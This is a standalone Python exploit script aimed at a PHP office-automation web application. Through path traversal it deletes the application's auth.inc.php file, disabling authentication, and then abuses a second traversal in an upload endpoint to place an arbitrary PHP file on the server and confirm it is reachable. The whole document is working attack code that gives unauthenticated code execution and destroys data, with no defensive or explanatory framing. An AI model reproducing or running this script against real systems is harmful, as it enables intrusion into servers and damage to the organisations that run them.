import requests
target="http://127.0.0.1:8203/"
payload="<?php echo 123456 ?>"
print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
input("Press enter to continue")
print("[*]Deleting auth.inc.php....")

url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
requests.get(url=url)
print("[*]Checking if file deleted...")
url=target+"/inc/auth.inc.php"
page=requests.get(url=url).text
if 'No input file specified.' not in page:
    print("[-]Failed to deleted auth.inc.php")
    exit(-1)
print("[+]Successfully deleted auth.inc.php!")
print("[*]Uploading payload...")
url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
files = {'FILE1': ('hack.php', payload)}
requests.post(url=url,files=files)
url=target+"/_hack.php"
page=requests.get(url=url).text
if 'No input file specified.' not in page:
    print("[+]Filed Uploaded Successfully")
    print("[+]URL:",url)
else:
    print("[-]Failed to upload file")
